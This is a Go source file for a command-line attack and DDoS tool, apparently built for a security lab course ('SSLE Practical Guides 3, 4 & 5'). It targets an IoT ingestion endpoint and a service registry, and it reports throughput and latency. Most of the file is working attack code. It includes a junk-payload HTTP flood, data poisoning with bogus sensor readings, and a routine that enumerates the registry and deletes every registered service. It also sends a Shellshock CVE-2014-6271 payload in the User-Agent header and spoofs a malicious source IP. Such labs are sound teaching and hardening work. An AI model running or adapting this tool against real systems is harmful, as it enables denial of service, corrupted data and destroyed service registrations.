package main

import (
	"bytes"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"log"
	"math/rand"
	"net/http"
	"os"
	"sort"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

// Config holds the attacker parameters
type Config struct {
	TargetURL     string
	RegistryURL   string
	Mode          string // "flood", "ddos", "benchmark", "poison", "deregister", "shellshock", "malicious_ip", "all"
	Concurrency   int
	RateLimitMs   int
	DeviceID      string
	DurationSecs  int
	TotalRequests int
}

var (
	totalRequests  atomic.Uint64
	success2xx     atomic.Uint64
	throttled429   atomic.Uint64
	blocked403     atomic.Uint64
	totalErrors    atomic.Uint64
	remainingReqs  atomic.Int64

	client = &http.Client{
		Timeout: 5 * time.Second,
		Transport: &http.Transport{
			MaxIdleConns:        100,
			MaxIdleConnsPerHost: 100,
			IdleConnTimeout:     30 * time.Second,
		},
	}

	latencyMu sync.Mutex
	latencies []float64 // in milliseconds
)

func recordLatency(ms float64) {
	latencyMu.Lock()
	if len(latencies) < 100000 {
		latencies = append(latencies, ms)
	}
	latencyMu.Unlock()
}

func getEnv(key, fallback string) string {
	if val := os.Getenv(key); val != "" {
		return val
	}
	return fallback
}

func main() {
	var cfg Config
	flag.StringVar(&cfg.TargetURL, "target", getEnv("TARGET_URL", "http://localhost:5001"), "Target ingestion/service base URL")
	flag.StringVar(&cfg.RegistryURL, "registry", getEnv("REGISTRY_URL", "http://localhost:5050"), "Target registry base URL")
	flag.StringVar(&cfg.Mode, "mode", getEnv("ATTACK_MODE", "flood"), "Attack mode: flood, ddos, benchmark, poison, deregister, shellshock, malicious_ip, or all")
	flag.IntVar(&cfg.Concurrency, "concurrency", 5, "Number of concurrent attacking threads (c)")
	flag.IntVar(&cfg.RateLimitMs, "delay", 10, "Delay between requests per thread in ms (0 for max flood)")
	flag.StringVar(&cfg.DeviceID, "device-id", getEnv("ATTACKER_DEVICE_ID", "attacker-bot-01"), "Attacker spoofed device ID")
	flag.IntVar(&cfg.DurationSecs, "duration", 0, "Duration in seconds to run attack (0 for infinite)")
	flag.IntVar(&cfg.TotalRequests, "requests", 0, "Total number of requests to execute across workers (0 for unlimited / duration-based, equivalent to ab -n)")
	flag.Parse()

	log.Printf("==============================================================")
	log.Printf("  SSLE Practical Guides 3, 4 & 5 - Adversary & DDoS Tool")
	log.Printf("==============================================================")
	log.Printf("  Target URL:       %s", cfg.TargetURL)
	log.Printf("  Registry URL:     %s", cfg.RegistryURL)
	log.Printf("  Attack Mode:      %s", cfg.Mode)
	log.Printf("  Concurrency (-c): %d workers", cfg.Concurrency)
	log.Printf("  Total Reqs (-n):  %d (0 = time-based)", cfg.TotalRequests)
	log.Printf("  Worker Delay:     %d ms", cfg.RateLimitMs)
	log.Printf("  Spoofed ID:       %s", cfg.DeviceID)
	log.Printf("==============================================================")

	if cfg.TotalRequests > 0 {
		remainingReqs.Store(int64(cfg.TotalRequests))
	} else {
		remainingReqs.Store(-1) // unlimited
	}

	stopCh := make(chan struct{})
	if cfg.DurationSecs > 0 {
		time.AfterFunc(time.Duration(cfg.DurationSecs)*time.Second, func() {
			log.Printf("Attack duration of %d seconds reached. Stopping...", cfg.DurationSecs)
			select {
			case <-stopCh:
			default:
				close(stopCh)
			}
		})
	}

	startTime := time.Now()

	// Periodic progress reporter
	go func() {
		ticker := time.NewTicker(2 * time.Second)
		defer ticker.Stop()
		var lastCount uint64
		for {
			select {
			case <-ticker.C:
				current := totalRequests.Load()
				diff := current - lastCount
				lastCount = current
				rps := float64(diff) / 2.0
				log.Printf("[Attack Metrics] Rate: %.1f req/s | Total Sent: %d | Throttled(429): %d | Blocked(403): %d | Errors: %d",
					rps, current, throttled429.Load(), blocked403.Load(), totalErrors.Load())
			case <-stopCh:
				return
			}
		}
	}()

	var wg sync.WaitGroup
	for i := 0; i < cfg.Concurrency; i++ {
		wg.Add(1)
		workerID := i + 1
		go func(id int) {
			defer wg.Done()
			runWorker(id, cfg, stopCh)
		}(workerID)
	}

	wg.Wait()
	elapsed := time.Since(startTime).Seconds()

	// Print Guide 5 Benchmark Summary Worksheet
	printBenchmarkSummary(elapsed, cfg)
}

func printBenchmarkSummary(elapsed float64, cfg Config) {
	tot := totalRequests.Load()
	succ := success2xx.Load()
	throt := throttled429.Load()
	block := blocked403.Load()
	errs := totalErrors.Load()

	rps := 0.0
	if elapsed > 0 {
		rps = float64(tot) / elapsed
	}

	latencyMu.Lock()
	data := make([]float64, len(latencies))
	copy(data, latencies)
	latencyMu.Unlock()

	var minLat, maxLat, medianLat, p95Lat, meanLat float64
	if len(data) > 0 {
		sort.Float64s(data)
		minLat = data[0]
		maxLat = data[len(data)-1]
		medianLat = data[len(data)/2]
		p95Idx := int(float64(len(data)) * 0.95)
		if p95Idx >= len(data) {
			p95Idx = len(data) - 1
		}
		p95Lat = data[p95Idx]

		sum := 0.0
		for _, v := range data {
			sum += v
		}
		meanLat = sum / float64(len(data))
	}

	fmt.Println()
	fmt.Println("==============================================================")
	fmt.Println("  SSLE Guide 5: DDoS & Target Hardening Benchmark Summary")
	fmt.Println("==============================================================")
	fmt.Printf("  Target Endpoint:       %s/ingest\n", cfg.TargetURL)
	fmt.Printf("  Concurrency:           %d\n", cfg.Concurrency)
	fmt.Printf("  Total Completed Reqs:  %d\n", tot)
	fmt.Printf("  Successful (2xx):      %d (%.1f%%)\n", succ, pct(succ, tot))
	fmt.Printf("  Throttled (429):       %d (%.1f%%)\n", throt, pct(throt, tot))
	fmt.Printf("  Forbidden/Blocked:     %d (%.1f%%)\n", block, pct(block, tot))
	fmt.Printf("  Failed/Connection Err: %d (%.1f%%)\n", errs, pct(errs, tot))
	fmt.Printf("  Time Taken:            %.3f seconds\n", elapsed)
	fmt.Printf("  Requests per second:   %.2f [#/sec] (mean)\n", rps)
	fmt.Printf("  Min Latency:           %.2f ms\n", minLat)
	fmt.Printf("  Mean Latency:          %.2f ms\n", meanLat)
	fmt.Printf("  Median Latency (p50):  %.2f ms\n", medianLat)
	fmt.Printf("  95th Percentile (p95): %.2f ms\n", p95Lat)
	fmt.Printf("  Max Latency:           %.2f ms\n", maxLat)
	fmt.Println("==============================================================")
}

func pct(part, total uint64) float64 {
	if total == 0 {
		return 0.0
	}
	return (float64(part) / float64(total)) * 100.0
}

func runWorker(workerID int, cfg Config, stopCh chan struct{}) {
	for {
		// Check global remaining requests limit
		if cfg.TotalRequests > 0 {
			left := remainingReqs.Add(-1)
			if left < 0 {
				return
			}
		}

		select {
		case <-stopCh:
			return
		default:
		}

		mode := cfg.Mode
		if mode == "all" {
			modes := []string{"flood", "poison", "deregister", "shellshock", "malicious_ip"}
			mode = modes[rand.Intn(len(modes))]
		}

		switch mode {
		case "poison":
			attackPoison(cfg)
		case "deregister":
			attackDeregister(cfg)
		case "shellshock":
			attackShellshock(cfg)
		case "malicious_ip":
			attackMaliciousIP(cfg)
		case "flood", "dos", "ddos", "benchmark":
			attackFlood(cfg)
		default:
			attackFlood(cfg)
		}

		if cfg.RateLimitMs > 0 {
			time.Sleep(time.Duration(cfg.RateLimitMs) * time.Millisecond)
		}
	}
}

// attackFlood: High-frequency HTTP POST to exhaust ingestion resources & QoS
func attackFlood(cfg Config) {
	endpoint := strings.TrimSuffix(cfg.TargetURL, "/") + "/ingest"
	payload := map[string]any{
		"device_id":   cfg.DeviceID,
		"temperature": 25.0 + rand.Float64()*5.0,
		"junk":        strings.Repeat("A", 1024), // 1KB junk payload to consume bandwidth/memory
	}

	body, _ := json.Marshal(payload)
	start := time.Now()
	resp, err := client.Post(endpoint, "application/json", bytes.NewBuffer(body))
	durationMs := float64(time.Since(start).Microseconds()) / 1000.0
	recordLatency(durationMs)

	totalRequests.Add(1)

	if err != nil {
		totalErrors.Add(1)
		return
	}
	defer resp.Body.Close()
	io.Copy(io.Discard, resp.Body)

	switch {
	case resp.StatusCode >= 200 && resp.StatusCode < 300:
		success2xx.Add(1)
	case resp.StatusCode == http.StatusTooManyRequests:
		throttled429.Add(1)
	case resp.StatusCode == http.StatusForbidden:
		blocked403.Add(1)
	default:
		totalErrors.Add(1)
	}
}

// attackPoison: Injects extreme/invalid temperature readings to skew statistics
func attackPoison(cfg Config) {
	endpoint := strings.TrimSuffix(cfg.TargetURL, "/") + "/ingest"
	poisonTemps := []float64{999.99, -273.15, 1250.0, -500.0, 9999.0}
	badTemp := poisonTemps[rand.Intn(len(poisonTemps))]

	payload := map[string]any{
		"device_id":   fmt.Sprintf("rogue-sensor-%d", rand.Intn(100)),
		"temperature": badTemp,
		"timestamp":   time.Now().UTC(),
	}

	body, _ := json.Marshal(payload)
	start := time.Now()
	resp, err := client.Post(endpoint, "application/json", bytes.NewBuffer(body))
	durationMs := float64(time.Since(start).Microseconds()) / 1000.0
	recordLatency(durationMs)

	totalRequests.Add(1)
	if err != nil {
		totalErrors.Add(1)
		return
	}
	defer resp.Body.Close()
	io.Copy(io.Discard, resp.Body)

	if resp.StatusCode >= 400 {
		totalErrors.Add(1)
	}
}

// attackDeregister: Discovers legitimate services and deletes them from registry
func attackDeregister(cfg Config) {
	servicesEndpoint := strings.TrimSuffix(cfg.RegistryURL, "/") + "/services"
	resp, err := client.Get(servicesEndpoint)
	if err != nil {
		totalErrors.Add(1)
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		totalErrors.Add(1)
		return
	}

	var services map[string]any
	if err := json.NewDecoder(resp.Body).Decode(&services); err != nil {
		totalErrors.Add(1)
		return
	}

	for serviceID := range services {
		delEndpoint := fmt.Sprintf("%s/register/%s", strings.TrimSuffix(cfg.RegistryURL, "/"), serviceID)
		req, err := http.NewRequest(http.MethodDelete, delEndpoint, nil)
		if err != nil {
			continue
		}
		delResp, err := client.Do(req)
		if err != nil {
			totalErrors.Add(1)
			continue
		}
		delResp.Body.Close()
		totalRequests.Add(1)
		if delResp.StatusCode >= 400 {
			totalErrors.Add(1)
		}
	}
}

// attackShellshock: Practical Guide 4 - Injects CVE-2014-6271 exploit payload via HTTP User-Agent header
func attackShellshock(cfg Config) {
	endpoint := strings.TrimSuffix(cfg.TargetURL, "/") + "/ingest"
	payload := map[string]any{
		"device_id":   "exploiter-node",
		"temperature": 22.0,
	}
	body, _ := json.Marshal(payload)

	req, err := http.NewRequest(http.MethodPost, endpoint, bytes.NewBuffer(body))
	if err != nil {
		totalErrors.Add(1)
		return
	}

	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("User-Agent", "() { :; }; /bin/bash -c 'echo VULNERABLE_CVE_2014_6271 > /tmp/shellshock_alert'")

	start := time.Now()
	resp, err := client.Do(req)
	durationMs := float64(time.Since(start).Microseconds()) / 1000.0
	recordLatency(durationMs)

	totalRequests.Add(1)
	if err != nil {
		totalErrors.Add(1)
		return
	}
	defer resp.Body.Close()
	io.Copy(io.Discard, resp.Body)

	if resp.StatusCode == http.StatusForbidden {
		blocked403.Add(1)
	} else if resp.StatusCode >= 400 {
		totalErrors.Add(1)
	}
}

// attackMaliciousIP: Sends request simulating an IP listed in the AlienVault IP reputation CDB list
func attackMaliciousIP(cfg Config) {
	endpoint := strings.TrimSuffix(cfg.TargetURL, "/") + "/ingest"
	payload := map[string]any{
		"device_id":   "reputation-bot",
		"temperature": 21.5,
	}
	body, _ := json.Marshal(payload)

	req, err := http.NewRequest(http.MethodPost, endpoint, bytes.NewBuffer(body))
	if err != nil {
		totalErrors.Add(1)
		return
	}

	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("X-Forwarded-For", "198.51.100.25")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) ThreatBot/1.0")

	start := time.Now()
	resp, err := client.Do(req)
	durationMs := float64(time.Since(start).Microseconds()) / 1000.0
	recordLatency(durationMs)

	totalRequests.Add(1)
	if err != nil {
		totalErrors.Add(1)
		return
	}
	defer resp.Body.Close()
	io.Copy(io.Discard, resp.Body)

	if resp.StatusCode >= 400 {
		totalErrors.Add(1)
	}
}
